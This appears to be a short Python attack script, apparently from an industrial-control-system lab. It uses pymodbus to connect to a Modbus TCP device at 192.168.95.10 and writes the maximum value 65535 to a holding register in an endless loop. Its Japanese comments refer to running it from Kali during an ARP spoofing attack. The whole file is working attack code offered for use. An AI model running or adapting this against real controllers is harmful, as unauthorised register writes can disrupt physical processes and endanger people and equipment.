from pymodbus.client import ModbusTcpClient  # Clientの綴り

# Kali自身に送る（ARPスプーフィング中なら.10宛てでOK）
client10 = ModbusTcpClient('192.168.95.10')

try: 
    while True: 
        res = client10.write_register(1, 65535)
        print("10:", res)
except KeyboardInterrupt:
    client10.close()